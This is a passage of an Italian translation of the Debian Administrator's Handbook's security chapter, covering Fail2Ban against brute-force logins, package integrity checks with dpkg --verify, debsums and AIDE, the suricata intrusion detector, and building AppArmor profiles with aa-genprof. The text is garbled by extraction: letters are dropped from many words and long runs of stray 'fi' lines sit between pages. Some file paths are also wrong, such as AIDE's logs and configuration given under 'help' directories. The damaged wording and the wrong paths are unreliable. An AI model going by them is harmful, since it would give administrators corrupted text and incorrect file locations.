                                                                             presentarli sotto forma di gra ci. Supporta diversi scripts per visualizzare i dati
                                                                             comunemente monitorati: carico del processore, traf co di rete, richieste (o
                                                                             accessi) di pagine web, ecc.
                                                                             I pacchetti mrtg-contrib e mrtgutils offrono degli scripts di esempio, che potrete
                                                                             utilizzare direttamente.

          14.3.3 Come evitare le intrusioni

          Gli attaccanti solitamente provano ad accedere ai servers supponendo le passwords; per tale ragione
          le passwords devono essere sempre complesse. In ogni caso dovrete considerare anche delle
          contromisure per gli attacchi a forza bruta. L’attacco a forza bruta consiste in un tentativo non
          autorizzato di accedere ad un sistema software attraverso l’implementazione di diversi tentativi di
          accesso in un intervallo di tempo piuttosto breve.

          Il metodo più semplice per impedire gli attacchi a forza bruta è limitare il numero di tentativi di
          accesso effettuati dalla stessa sorgente, generalmente bloccando (banning) temporaneamente un
          indirizzo IP.

          Fail2Ban è un suite software di prevenzione dagli accessi non autorizzati (intrusioni) che può essere
          con gurata per monitorare qualsiasi servizio, nonché i le di logs che riportano i tentativi di accesso.
          È disponibile attraverso il pacchetto fail2ban.

          Fail2Ban viene con gurato attraverso un semplice protocollo e tramite fail2ban-client, che
          scansiona i les di con gurazione e le istanze al server fail2ban-server presentate sotto forma di
          configuration comands [i comandi che caricano i les di con gurazione]. Fail2Ban dispone di
          quattro tipi di les di con gurazione, che vengono memorizzati in /etc/fail2ban:

          • fail2Ban.conf Con gurazione globale (tra cui riguardo al logging);
          • filter.d/*.conf I ltri che de niscono come rilevare i tentativi di autenticazione falliti. Il
            pacchetto Debian include i ltri per diversi programmi piuttosto comuni;
          • action.d/*.conf Le azioni che de niscono i comandi per il banning o per sbloccare gli indirizzi
            IP;
          • jail.conf Questo le contiene i jails, combinazioni di ltri e azioni.

          A seguire un estratto della con gurazione di sshd in /etc/fail2ban/jail.conf per comprendere
          come funziona Fail2Ban …

          [...]
          [DEFAULT]
          [...]
          bantime = 10m
          [...]
          maxretry = 5
           [...]
          [sshd]
          port    = ssh
          logpath = %(sshd_log)s
          backend = %(sshd_backend)s

          Pagina 412 Il Manuale dell’Amministratore di Debian TDAH_2.0
fi
     fi
            fi
                 fi
                      fi
                           fi
                                fi
                                     fi
                                          fi
                                               fi
                                                    fi
                                                         fi
                                                              fi
                                                                   fi
                                                                        fi
                                                                                          fi
                                                                                               fi
                                                                                                    fi
                                                                                                         fi
                                                                                                              fi
                         Fail2Ban veri ca i tentativi di autenticazione falliti di sshd utilizzando le espressioni regolari in
                         Python de nite in /etc/fail2ban/filters.d/sshd.conf nei confronti del log le (di sshd); il log
                          le di sshd viene individuato attraverso la variabile sshd_log nel le /etc/fail2ban/
                         paths_common.conf. Se Fail2Ban rileva 5 tentativi di autenticazione falliti in sequenza, viene
                         bloccato l’IP corrispondente alla sorgente dei tentati di accesso.

                         Fail2Ban è uno strumento ef cace contro i tentativi di attacchi a forza bruta, ma non è infallibile;
                         difatti non può prevenire gli attacchi a forza bruta distribuiti ed implementati attraverso diverse
                         macchine connesse ad internet.

                         Un buon metodo per scongiurare gli attacchi a forza bruta distribuiti è incrementare il login time
                         dopo ogni tentativo di accesso fallito.

                         14.3.4. Rilevamento delle modi che

                         Completata l’installazione del sistema e la sua con gurazione, bloccati gli aggiornamenti di sicurezza
                         automatici, non c’è ragione per cui lo stato della maggior parte dei les e delle directories dovrebbe
                         cambiare, fatta eccezione per i dati. Quindi potrebbe essere utile accertarsi che nessun le sia
                         effettivamente cambiato, dato che eventuali modi che impreviste sono da ritenersi sospette. In
                         questo paragrafo sono presentati degli strumenti idonei per monitorare i les e noti care agli
                         amministratori eventuali cambiamenti non previsti (o semplicemente per elencarli in una lista).

                         14.3.4.1 La validazione dei pacchetti tramite il comando dpkg --verify

                                 ANDANDO                                     dpkg --verify può essere utilizzato per rilevare le modi che apportate ad un le
                                                                             da un pacchetto Debian, ma è inutile se lo stesso pacchetto Debian è stato alterato,
                                    OLTRE
                                                                             ad esempio compromettendo il mirror Debian. Per proteggervi da questo tipo di
                          Come proteggersi                                   attacchi dovrete utilizzare il sistema di veri ca della rma digitale integrato in APT
                          dalle modi che a                                   (andate a leggere il paragrafo 6.6, “Veri ca dell'autenticità del pacchetto” a pagina
                          monte                                              133) ed installare esclusivamente i pacchetti con origine certi cata.

                         dpkg --verify (o dpkg -V) è uno strumento che consente di scovare i les installati e modi cati
                         (potenzialmente da un malintenzionato), ma non è consigliabile darsi ciecamente. Difatti dpkg per
                         eseguire la suddetta attività si af da ai checksums conservati nel suo stesso database, a sua volta
                         memorizzato nel disco rigido (nel le /var/lib/dpkg/info/package.md5sums); un
                         malintenzionato abile potrebbe aggiornare i les [del database] in modo che includano i checksums
                         dei les compromessi.

                                 BASILARE                                    Un breve promemoria: un’impronta digitale è un valore, solitamente numerico
                                                                             (sebbene esadecimale), che costituisce una sorta di rma del contenuto di un le. La
                          Fingerprint                                          rma viene elaborata attraverso un algoritmo (MD5 e SHA1 sono esempi noti) e
                          (impronta                                          garantisce più o meno il rilevamento di eventuali modi che del le, anche se
                          digitale) di un le                                 irrilevanti, dato che ciascuna modi ca del le altera l'impronta digitale; il suddetto
                                                                             effetto viene denominato “avalanche effect” (“effetto valanga”). Ed è proprio questo
                                                                             effetto a consentire ad un semplice ngerprint numerico di essere il test decisivo
                                                                             per veri care se il contenuto di un le è stato alterato. Gli algoritmi non sono
                                                                             reversibili; ciò signi ca che pur conoscendo l’impronta digitale non è possibile
                                                                             ricostruire i corrispondenti contenuti. In realtà recenti studi hanno invalidato
                                                                             l’assolutezza (o inviolabilità) dei suddetti principi, ciò nonostante il loro impiego è
                                                                             ancora indiscusso, dato che tutt’oggi la creazione di diversi contenuti che
                                                                             corrispondono alla stessa impronta digitale è ancora un’attività complessa.

                                                                                                                                      TDAH_2.0                      Capitolo XIV - Sicurezza Pagina 413
fi
fi
     fi
          fi
               fi
                    fi
                          fi
                               fi
                                    fi
                                          fi
                                               fi
                                               fi
                                                    fi
                                                         fi
                                                              fi
                                                                   fi
                                                                        fi
                                                                               fi
                                                                                    fi
                                                                                         fi
                                                                                              fi
                                                                                                   fi
                                                                                                        fi
                                                                                                             fi
                                                                                                                  fi
                                                                                                                       fi
                                                                                                                            fi
                                                                                                                                 fi
                                                                                                                                      fi
                                                                                                                                           fi
                                                                                                                                                fi
                                                                                                                                                     fi
                                                                                                                                                          fi
                                                                                                                                                          fi
                                                                                                                                                               fi
                                                                                                                                                                        fi
                                                                                                                                                                             fi
                                                                                                                                                                                  fi
                                                                                                                                                                                       fi
     Il comando dpkg -V esegue il controllo di tutti i pacchetti installati e riporta ogni le
     che non supera il test di integrità riga per riga. Il formato output è lo stesso di rpm -V, ma in
     quest’ultimo ogni carattere corrisponde ad un test per uno speci co metadata. Sfortunatamente,
     dpkg non include i metadati necessari per eseguire più tests e pertanto si limiterà a visualizzare solo
     punti interrogativi. Al momento viene segnalato soltanto il fallimento della veri ca del checksum
     attraverso un "5" come terzo carattere.

     # dpkg -V
     ??5??????   /lib/systemd/system/ssh.service
     ??5?????? c /etc/libvirt/qemu/networks/default.xml
     ??5?????? c /etc/lvm/lvm.conf
     ??5?????? c /etc/salt/roster

     Nell'esempio soprastante, dpkg riporta una modi ca del le service di SSH effettuata
     impropriamente dall’amministratore direttamente nel le del pacchetto; diversamente
     l’amministratore avrebbe dovuto eseguire un appropriato override (trad. lett. ignora o ignora e
     sostituisci con) attraverso il le /etc/systemd/system/ssh.service ( le che dovrebbe essere
     salvato in /etc come qualsiasi altra con gurazione personalizzata).
     dpkg ha elencato inoltre diversi les di con gurazione (identi cati dalla lettera "c" nel secondo
     campo) che sono stati legittimamente modi cati.

     14.3.4.2 Veri ca dei pacchetti con debsums nonostante i suoi limiti

     debsums è l'antenato di dpkg -V, che lo ha reso quasi obsoleto. debsums presenta gli stessi limiti di
     dpkg. Fortunatamente è possibile aggirare tali limiti attraverso dei work-arounds (cosa che dpkg
     non consente di fare).
     Dato che i dati sul disco non possono essere accertati, debsums effettua i suoi controlli basandosi sui
      le .deb e non sul database di dpkg. Per scaricare les .deb af dabili di tutti i pacchetti installati
     dovrete effettuare il download autenticato di APT. Questa operazione potrebbe essere lunga e
     tediosa, pertanto non è consigliabile includerla come misura proattiva da impiegare ripetutamente.

     # apt-get --reinstall -d install ‘grep-status -e ’Status: install ok installed’ -n -s
     -> Package‘
     [ ... ]
     # debsums -p /var/cache/apt/archives --generate=all

     Si precisa che nel soprastante esempio è stato utilizzato il comando grep-status incluso nel
     pacchetto dctrl-tools, che non è installato di default.

     Potrete eseguire debsum attraverso cronjob con gurando CRON_CHECK in /etc/default/debsums.
     Per ignorare dei les posizionati al di fuori della directory /etc, modi cati ad hoc o in attesa di
     essere personalizzati (ad esempio /usr/share/misc/pci.ids) dovrete aggiungerli a /etc/
     debsum-ignore.

     14.3.4.3 Monitoraggio dei les: AIDE

     AIDE (Advanced Intrusion Detection Environment) è uno strumento utilizzato per: veri care
     l'integrità dei les; rilevare eventuali modi che rispetto ad un'immagine del sistema (af dabile)
     precedentemente salvata.

     Pagina 414 Il Manuale dell’Amministratore di Debian TDAH_2.0
fi
      fi
       fi
            fi
                     fi
                          fi
                               fi
                                    fi
                                         fi
                                              fi
                                                   fi
                                                        fi
                                                             fi
                                                                  fi
                                                                       fi
                                                                            fi
                                                                                 fi
                                                                                  fi
                                                                                       fi
                                                                                            fi
                                                                                                 fi
                                                                                                      fi
                                                                                                           fi
                                                                                                                fi
                                                                                                                     fi
               L’immagine viene memorizzata sotto forma di database (/var/lib/aide/aide.db) ed include tutte
               le informazioni rilevanti di tutti i les presenti nel sistema ( ngerprints, permessi, timestamps,
               ecc.). Il database viene inizializzato per la prima volta da aideinit; dopodiché viene utilizzato
               quotidianamente (attraverso lo script /etc/cron.daily/aide) per veri care che non sono presenti
               modi che sospette. Se vengono rilevate delle modi che, AIDE le salva in un log le (/var/log/
               help/*.log) e ne invia i risultati all'amministratore via email.

                                                Dato che AIDE utilizza un database locale per veri care lo stato dei les, la validità
                     IN PRATICA                 dei risultati dell’accertamento di AIDE è direttamente “dipendente” dalla validità
                Protezione del                  del database locale. Se un malintenzionato riesce ad ottenere l’accesso al sistema
                database                        come root sarà in grado anche di sostituire il database e di coprire le sue tracce.
                                                Pertanto è consigliabile memorizzare il database “di riferimento” su un supporto di
                                                memorizzazione read-only (solo leggibile).

               Il funzionamento del pacchetto aide può essere modi cato grazie a diverse opzioni in /etc/
               default/help. La con gurazione di AIDE si trova in /etc/help/help.conf e /etc/aide/
               aide.conf.d/ (di fatto, questi les vengono impiegati da update-aide.conf
               per generare /var/lib/aide/aide.conf.autogenerated). La con gurazione individua quali
               proprietà dei les devono essere controllate. Ad esempio, il contenuto dei log le cambia
               ripetutamente pertanto tali cambiamenti possono essere ignorati a patto che i permessi correlati
               non siano stati modi cati, ma il contenuto ed i permessi dei programmi eseguibili devono rimanere
               inalterati. Sebbene la sintassi della con gurazione non sia complessa, rimane comunque poco
               intuitiva, di conseguenza la lettura della man page di aide.conf(5) è raccomandata.

               Ogni giorno viene generata una nuova versione del database in /var/lib/aide/aide.
               db.new; se tutti i cambiamenti registrati sono attendibili potrete utilizzare il correlato database per
               sostituire il corrente database di riferimento.

                  ALTERNATIVA                   Tripwire è simile ad AIDE; la sintassi del suo le di con gurazione è per lo più la
                Tripwire e                      stessa di AIDE. Ma tripwire consente inoltre di rmare il le di con gurazione in
                                                modo che un malintenzionato non possa modi carlo af nché utilizzi una versione
                Samhain                         alterata del database di riferimento.
                                                Anche Samhain offre funzionalità simili ad AIDE, ma include in aggiunta la
                                                possibilità di rilevare la presenza di rootkit (per maggiori informazioni consultare
                                                la casella di testo "I pacchetti checksecurity e chkrootkit/rkhunter” a pagina 415).
                                                Inoltre, consente il suo deployment su un'intera rete e registra i suoi tracciamenti
                                                su un server centrale (con rma).

                           BREVE                Il pacchetto checksecurity include diversi scripts di piccole dimensioni che
                       ACCENNO                  mettono in esecuzione i controlli base sul sistema (password assenti, creazione di
                                                nuovi les con permessi setuid, ecc.) e gli eventuali avvisi all’amministratore se il
                I pacchetti                     caso lo richiede. Si precisa però che un amministratore non dovrebbe basare la
                checksecurity                   sicurezza di un sistema Linux esclusivamente sul suddetto pacchetto, nonostante il
                e chkrootkit/                   suo nome.
                rkhunter                        I pacchetti chkrootkit e rkhunter scansionano il sistema onde scongiurare la
                                                presenza di rootkit. Ma i rootkit sono componenti software progettati per prendere
                                                il controllo del sistema celando le loro tracce. Pertanto le veri che dei suddetti
                                                pacchetti non sono infallibili al 100%, ma quanto meno richiamano l’attenzione
                                                dell’amministratore qualora ci fossero potenziali anomalie.
                                                rkhunter esegue inoltre diversi controlli per veri care: se i comandi sono stati
                                                modi cati; se i les di avvio di sistema sono stati alterati; le interfacce di rete
                                                incluse le applicazioni in ricezione.

                                                                                                                     TDAH_2.0     Capitolo XIV - Sicurezza Pagina 415
fi
     fi
          fi
                fi
                 fi
                       fi
                            fi
                                 fi
                                      fi
                                           fi
                                                   fi
                                                        fi
                                                             fi
                                                                  fi
                                                                       fi
                                                                            fi
                                                                                 fi
                                                                                 fi
                                                                                      fi
                                                                                           fi
                                                                                            fi
                                                                                                 fi
                                                                                                      fi
                                                                                                           fi
                                                                                                                fi
                                                                                                                        fi
                                                                                                                             fi
                                                                                                                                  fi
                                                                                                                                       fi
               14.3.5. Intrusion Detection System / Network Detection System (IDS/NIDS)

                       BASILARE                    Un attacco “denial of service” ha il solo scopo di rendere un servizio inutilizzabile.
                                                   Viene implementato in diversi modi, sovraccaricando il server con queries o
                Denial of service
                                                   attraverso l’exploit di un bug, ma il risultato è sempre lo stesso: il servizio in
                                                   questione diventa inservibile. Così facendo gli utenti, consumatori del servizio
                                                   erogato dal provider, rimangono scontenti ed il fornitore dei servizi subisce un
                                                   danno di reputazione (con effetti sul fatturato, specialmente se si tratta di un sito e-
                                                   commerce).
                                                   Un attacco “denial of service” a volte viene "distribuito", sovraccaricando il server
                                                   attraverso diverse queries provenienti da più sorgenti, in modo che il server non
                                                   possa più rispondere alle richieste legittime. Gli attacchi “denial of service” hanno
                                                   un loro acronimo in inglese: DoS o DDoS (se distribuito).

               suricata (disponibile attraverso l'omonimo pacchetto Debian) è uno strumento di rilevamento delle
               intrusioni di rete (NIDS — Network Intrusion Detection System). Si mette in ricezione della rete
               per rilevare i tentativi di intrusione e/o atti ostili (come attacchi “denial of service”). Tutti gli eventi
               vengono registrati in diversi log les archiviati in /var/log/suricata. Strumenti di terze parti
               (Kibana/Logstash) consentono una migliore consultazione dei dati raccolti.

                 https://suricata-ids.org
                 https://www.elastic.co/products/kibana

                   ATTENZIONE                      L’ef cacia di suricata si limita al traf co che monitora attraverso l’interfaccia di
                                                   rete. Difatti suricata rileva ciò che avviene nella rete (effettiva) soltanto se in
                Campo di azione                    condizione di porsi in ricezione di quest’ultima. Ad esempio se connesso
                                                   genericamente ad uno switch di rete, suricata non riesce a raggiungere il ne per
                                                   cui è stato installato, monitorando soltanto gli attacchi mirati alla macchina che lo
                                                   ospita. Pertanto dovrete collegare la macchina che ospita suricata al port destinato
                                                   al port mirroring dello switch [che consente di catturare una copia dei pacchetti
                                                   di rete], in questo modo se sono presenti più switch connessi fra loro in chaining
                                                   suricata è in grado di monitorare l’intero traf co di rete.

               La con gurazione di Suricata avviene tramite la revisione e la personalizzazione del le /etc/
               suricata/suricata-debian.yaml, che è piuttosto prolisso dato che ciascun parametro è
               abbondantemente commentato. La con gurazione minima richiede che venga de nito l'intervallo di
               indirizzi della rete locale (il parametro HOME_NET). In pratica, l'insieme di tutti i potenziali bersagli
               di un attacco. Ma una con gurazione adeguata necessità una lettura approfondita del sopracitato le
               allo scopo di modi carlo in base al contesto locale.

               Dovrete anche modi care /etc/default/suricata per individuare l'interfaccia di rete da
               monitorare ed abilitare lo script init (impostando RUN=yes). È consigliabile inoltre impostare
               LISTENMODE=pcap, visto che la modalità prede nita LISTENMODE=nfqueue richiede un’ulteriore
               con gurazione (ossia il rewall netfilter deve essere con gurato in modo che trasmetta i
               pacchetti ad una “user-space queue” gestita da suricata tramite NFQUEUE).

               suricata per rilevare funzionalità anomale necessita anche di un ruleset di supervisione
               disponibile nel pacchetto snort-rules-default. snort difatti è uno strumento storico di
               riferimento per quel che concerne il rilevamento delle intrusioni (IDS — Intrusion Detection
               System) e suricata può sfruttare le sue regole.

               Pagina 416 Il Manuale dell’Amministratore di Debian TDAH_2.0
fi
     fi
          fi
                     fi
                          fi
                               fi
                                    fi
                                         fi
                                              fi
                                                      fi
                                                           fi
                                                                fi
                                                                              fi
                                                                                      fi
                                                                                                       fi
                                                                                                            fi
                                                                                                                           fi
     Un'altra alternativa è oinkmaster (disponibile nel pacchetto omonimo), in grado di scaricare il
     ruleset di Snort da sorgenti esterne.

             ANDANDO         Prelude offre un monitoraggio centralizzato delle informazioni di sicurezza. La sua
                OLTRE        struttura modulare include un server (svolge le funzioni di manager ed è incluso nel
                             pacchetto prelude-manager) che archivia gli avvisi rilevati e trasmessi dai
      Integrazione con
                             sensors di vario tipo.
      prelude
                             Suricata può essere con gurato per svolgere la funzione di sensor. In alternativa
                             potrete fare riferimento a prelude-lml (Log Monitor Lackey) che si occupa del
                             monitoraggio dei log les (come logcheck già descritto nel paragrafo 14.3.1,
                             “Monitoraggio dei logs con logcheck” pag. 410).

     14.4. Introduzione ad AppArmor

     14.4.1. I principi

     AppArmor è un Mandatory Access Control (MAC) [trad. lett. sistema controllo accessi] che si basa
     sull’interfaccia Linux LMS (Linux Security Modules). In pratica il kernel richiede ad AppArmor
     prima di rispondere a qualsiasi chiamata di sistema [il meccanismo attraverso cui un’applicazione
     richiede un servizio al kernel] se il processo coinvolto è autorizzato ad ottenere l’implementazione
     dell'operazione in questione. Attraverso questo meccanismo AppArmor limita una serie di risorse ai
     programmi.

     AppArmor applica una serie di regole (denominate "profile") a ciascun programma. Il pro lo a sua
     volta, messo in atto dal kernel, dipende dal percorso di installazione del programma da eseguire.
     Difatti contrariamente a SELinux (descritto nel paragrafo 14.5, “Introduzione a SELinux” a pagina
     424) le regole di AppArmor non dipendono dall'utente. Di conseguenza tutti gli utenti dovranno
     attenersi alle stesse regole quando utilizzano lo stesso programma (tenuto ovviamente presente che
     anche i permessi utente potrebbero avere un effetto con risultati diversi sul funzionamento del
     programma in questione!).

     I pro li di AppArmor vengono salvati in /etc/apparmor.d/ e consistono in un elenco di regole sul
     controllo accesso alle risorse a cui ciascun programma deve attenersi. I pro li sono compilati e
     caricati nel kernel attraverso il comando apparmor_parser. Ciascun pro lo può essere caricato in
     modalità enforcing (rigida) o in modalità complaining (reclamo). La modalità enforcing impone
     il rispetto della politica di sicurezza e segnala i tentativi di violazione, mentre la modalità
     complaining si limita a creare dei logs per le chiamate di sistema che in teoria dovrebbero essere
     negate, ma che in pratica vengono comunque implementate.

     14.4.2. Come attivare AppArmor e gestire i pro li AppArmor

     Il supporto di AppArmor è integrato nei kernels prede niti offerti da Debian. Per attivare
     AppArmor, dovrete installare dei pacchetti eseguendo con privilegi di root:
     apt install apparmor apparmor-profiles apparmor-utils

     Dopo un riavvio AppArmor sarà operativo ed il comando aa-status lo confermerà:

     # aa-status
     apparmor module is loaded.
     40 profiles are loaded.
     23 profiles are in enforce mode.
       /usr/bin/evince
       /usr/lib/evince-previewer

                                                           TDAH_2.0             Capitolo XIV - Sicurezza Pagina 417
fi
           fi
                fi
                                           fi
                                                 fi
                                                                      fi
                                                                           fi
                                                                                              fi
          [...]
          17 profiles are in complain mode.
            /usr/sbin/dnsmasq
          [...]
          14 processes have profiles defined.
          12 processes are in enforce mode.
            /usr/sbin/evince (3462)
          2 processes are in complain mode.
            /usr/sbin/avahi-daemon (429) avahi-daemon
            /usr/sbin/avahi-daemon (511) avahi-daemon
          0 processes are unconfined but have a profile defined.

                             NOTA             Il pacchetto apparmor-profiles include i pro li sviluppati dalla comunità
               Come ottenere                  upstream di AppArmor. Se desiderate altri pro li potrete installare apparmor-
               altri pro li da                profiles-extra, che contiene i pro li sviluppati da Ubuntu e Debian.
               AppArmor

          Potrete cambiare lo stato di ciascun pro lo in modalità enforcing (rigida) o in modalità
          complaining (reclamo) attraverso i comandi aa-enforce e aa-complain, inserendo come
          parametri il percorso dell'eseguibile o del policy le. Allo stesso modo potrete disabilitare
          completamente un pro lo con aa-disable oppure convertirlo in modalità audit [valutazione-
          controllo] (in modo che vengano registrati nei logs anche le chiamate di sistema autorizzate) con
          aa-audit.

          # aa-enforce /usr/sbin/pdgin
          Setting /usr/sbin/pdgin to enforce mode.
          # aa-complain /usr/sbin/dnsmasq
          Setting /usr/sbin/dnsmasq to complain mode.

          14.4.3. Come creare un nuovo pro lo

          Sebbene sia abbastanza semplice creare un pro lo AppArmor, la maggior parte dei programmi non
          offre un pro lo nativamente.
          Questo paragrafo vi metterà in condizioni di creare un nuovo pro lo da zero, semplicemente
          mettendo in esecuzione il programma bersaglio in modo che AppArmor possa monitorare le sue
          chiamate di sistema ed istruirsi riguardo alle risorse che utilizza.

          I programmi che dovranno essere monitorati e limitati (in gergo di AppArmor “con nati”)
          nell’utilizzo delle risorse sono quelli che si connettono alla rete o che sono notoriamente oggetto di
          attacchi. AppArmor a tale scopo dispone del comando aa-unconfined, che elenca i programmi privi
          di un pro lo associato e che sono esposti ad un network socket aperto [Un network socket è
          un’astrazione software in un nodo di rete, sico o software, che funge da endpoint per la ricezione e
          la trasmissione dei dati nella rete]. L'opzione --paranoid elenca tutti i processi non con nati che
          hanno almeno una connessione di rete attiva.

          # aa-unconfined
          801 /sbin/dhclient not confined
          409 /usr/sbin/NetworkManager not confined
          411 /usr/sbin/cupsd confined by ’/usr/sbin/cupsd (enforce)’
          429 /usr/sbin/avahi-daemon confined by ’avahi-daemon (enforce)’
          516 /usr/sbin/cups-browsed confined by ’/usr/sbin/cups-browsed (enforce)’
          538 /usr/sbin/zebra not confined

          Pagina 418 Il Manuale dell’Amministratore di Debian TDAH_2.0
fi
     fi
          fi
                        fi
                                    fi
                                         fi
                                                  fi
                                                       fi
                                                       fi
                                                            fi
                                                                 fi
                                                                      fi
                                                                             fi
                                                                                                fi
                                                                                                      fi
591 /usr/sbin/named not confined
847 /usr/sbin/mysqld not confined
849 /usr/sbin/sshd not confined
1013 /usr/sbin/dhclient (/sbin/dhclient) not confined
1276 /usr/sbin/apache2 not confined
1322 /usr/sbin/apache2 not confined
1323 /usr/sbin/apache2 not confined
1324 /usr/sbin/apache2 not confined
1325 /usr/sbin/apache2 not confined
1327 /usr/sbin/apache2 not confined
1829 /usr/lib/ipsec/charon confined by ’/usr/lib/ipsec/charon (enforce)’
2132 /usr/sbin/exim4 not confined
12865 /usr/bin/python3.7 (/usr/bin/python3) not confined
12873 /usr/bin/python3.7 (/usr/bin/python3) not confined

L'esempio seguente mostra come creare un pro lo per /sbin/dhclient. Il comando aa-genprof
dhclient viene utilizzato a tale scopo. Purtroppo in Debian Buster esiste un bug noto (https://
bugs.debian.org/cgi-bin/bugreport.cgi?bug=928160) che fa fallire il precedente comando emettendo
il seguente errore: ERROR: Include file /etc/apparmor.d/local/usr.lib.dovecot.deliver
not found Per correre il bug dovrete creare il le mancante con touch file. La risposta del
comando invita a mettere in esecuzione l'applicazione in questione in un'altra nestra e dopodiché di
ritornare alla nestra aperta con aa-genprof per avviare la scansione di AppArmor degli eventi e la
loro archiviazione nei logs; in ne i logs verranno convertiti in regole di controllo accesso. Per
ciascun evento registrato da AppArmor aa-genprof propone uno o più regole che possono essere
autorizzate o personalizzate in diversi modi:

# aa-genprof dhclient
Writing updated profile for /sbin/dhclient.
Setting /sbin/dhclient to complain mode.

Before you begin, you may wish to check if a
profile already exists for the application you
wish to confine. See the following wiki page for
more information:
http://wiki.apparmor.net/index.php/Profiles

Profiling: /sbin/dhclient

Please start the application to be profiled in
another window and exercise its functionality now.

Once completed, select the ”Scan” option below in
order to scan the system logs for AppArmor events.

For each AppArmor event, you will be given the
opportunity to choose whether the access should be
allowed or denied.

[(S)can system log for AppArmor events] / (F)inish

                                                   TDAH_2.0    Capitolo XIV - Sicurezza Pagina 419
  fi
                 fi
                                  fi
                                       fi
                                                                 fi
Reading log entries from /var/log/syslog.
Updating AppArmor profiles in /etc/apparmor.d

Profile: /usr/sbin/dhclient 1
Execute: /usr/sbin/dhclient-script
Severity: unknown

(I)nherit / (C)hild / (P)rofile / (N)amed / (U)nconfined / (X) ix On / (D)eny / Abo(r
➥ )t / (F)inish
P
Should AppArmor sanitise the environment when
switching profiles?

Sanitising environment is more secure,
but some applications depend on the presence
of LD_PRELOAD or LD_LIBRARY_PATH.

(Y)es / [(N)o]

Y
Writing updated profile for /usr/sbin/dhclient-script.
Complain-mode changes:

Profile: /sbin/dhclient 2
Capability: net_raw
Severity: 8

[(A)llow] / (D)eny / (I)gnore / Audi(t) / Abo(r)t / (F)inish
A
Adding capability net_raw to profile.

Profile: /sbin/dhclient
Capability: /net_bind_service
Severity: 8

  [1 - #include <abstractions/nis> ]
   2 - capability net_bind_service,
[(A)llow] / (D)eny / (I)gnore / Audi(t) / Abo(r)t / (F)inish
A
Adding #include <abstraction/nis> to profile

Profile: /sbin/dhclient 3
Path: /etc/ssl/openssl.cnf
New Mode: owner r
Severity: 2

[1 -   #include <abstractions/lightdm>]
 2 -   #include <abstractions/openssl>
 3 -   #include <abstractions/sslkeys>

Pagina 420 Il Manuale dell’Amministratore di Debian TDAH_2.0
4 - owner /etc/ssl/openssl.cnf r,
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Audi(t) /(O
->)wner permissions off / Abo(r)t / Finish / (M)ore

2

Profile:    /usr/sbin/dhclient
Path:       /etc/ssl/openssl.cnf
New Mode:   owner r
Severity:   2

  1 - #include <abstractions/lightdm>
 [2 - #include <abstractions/openssl>]
  3 - #include <abstractions/ssl_keys>
  4 - owner /etc/ssl/openssl.cnf r,
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F
-> )inish / (M)ore

A
[...]
Profile: /usr/sbin/dhclient-script 4
Path: /usr/bin/dash
New Mode: owner r
Severity: unknown

  [1 - #include <abstractions/lightdm>]
   2 - #include <abstractions/ubuntu-browsers.d/plugins-common>
   3 - owner /usr/bin/dash r,
(A)llow / [(D)eny] / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Audi(t)/(O
->)wner permissions off / Abo(r)t / (F)inish

A
Adding #include <abstractions/lightdm> to profile.
Deleted 2 previous matching profile entries.

= Changed Local Profiles =

The following local profiles were changed. Would you like to save them?

[1 - /usr/sbin/dhclient]
  2 - /usr/sbin/dhclient-script
(S)ave Changes / Save Selec(t)ed Profile / [(V)iew Changes] / View Changes b/w (C)
 -> lean profiles / Abo(r)t

S
Writing updated profile for /usr/sbin/dhclient.
Writing updated profile for /usr/sbin/dhclient-script.

Profiling: /usr/sbin/dhclient

Please start the application to be profiled in
another window and exercise its functionality now.

                                             TDAH_2.0    Capitolo XIV - Sicurezza Pagina 421
          Once completed, select the ”Scan” option below in
          order to scan the system logs for AppArmor events.

          For each AppArmor event, you will be given the
           opportunity to choose whether the access should be
          allowed or denied.

          [(S)can system log for AppArmor events] / (F)inish
          F
          Reloaded AppArmor profiles in enforce mode.

          Please consider contributing your new profile!
          See the following wiki page for more information:
          https://gitlab.com/apparmor/apparmor/wikis/Profiles

          Finished generating profile for /usr/sbin/dhclient.

          Si precisa che il programma non visualizza i caratteri di controllo che immetterete in risposta alle
          sue richieste; i caratteri di controllo sono stati trascritti nell’esempio precedente solo per una
          maggiore comprensione degli argomenti trattati.

          1 Il primo evento rilevato è l'esecuzione di un altro programma. In questo caso avrete a disposizione
          diverse scelte ossia potrete eseguire il programma con: il pro lo del parent process (l’opzione
          “Inherit”); un pro lo dedicato, attraverso l’opzione “Pro le” oppure attraverso l’opzione “Named” (se
          desiderate assegnare un nome); un sottopro lo del parent process (l’opzione “Child”); senza alcun
          pro lo (l’opzione “Uncon ned”); in alternativa potrete negare l’esecuzione del programma
          (l’opzione“Deny”).
          Occorre far presente che se avvierete il processo optando per un pro lo dedicato inesistente, il tool
          ne creerà uno nuovo suggerendovi le regole da includere durante la sua stessa creazione.

          2 A livello di kernel, i diritti speciali dell'utente root vengono suddivisi in “capabilities”. Se una
          chiamata di sistema richiede una capacità speci ca, AppArmor veri cherà il pro lo e se il
          programma è autorizzato ad utilizzare la suddetta capacità.

          3 Il programma richiede i permessi di lettura di /etc/openssl.conf. aa-genprof in questo caso ha
          rilevato che i permessi di lettura del le in questione sono garantiti da diverse “astrazioni” e li
          suggerisce come scelte alternative. Un'astrazione offre un insieme di regole di controllo accessi
          inerenti a diverse risorse che notoriamente vengono impiegate insieme.
          Nel caso speci co, il sopracitato le è accessibile tramite le funzioni (relative al nameservice) della
          libreria C; nell’esempio è stata scelta la terza astrazione disponibile nell’elenco suggerito
          (immettendo il carattere 2) "#include <abstractions/openssl>"; dopodiché è stata scelta
          l’opzione "A" per autorizzare.

          4 Occorre precisare che la presente richiesta di accesso non fa parte del pro lo dhclient, ma del
          nuovo pro lo creato (al punto 1) /usr/sbin/dhclient-script per poter processare un pro lo
          personalizzato.

          Pagina 422 Il Manuale dell’Amministratore di Debian TDAH_2.0
fi
     fi
            fi
                 fi
                       fi
                               fi
                                    fi
                                            fi
                                                 fi
                                                         fi
                                                              fi
                                                                      fi
                                                                           fi
                                                                                fi
                                                                                     fi
                                                                                                  fi
Il programma, dopo aver monitorato e registrato tutti gli eventi, propone di salvare tutti i pro li
creati durante l’esecuzione. Nell’esempio i pro li da salvare sono due (anche se è possibile salvarli
individualmente); di conseguenza viene scelta l’opzione “Save” e poi l’opzione “Finish” per uscire dal
programma.

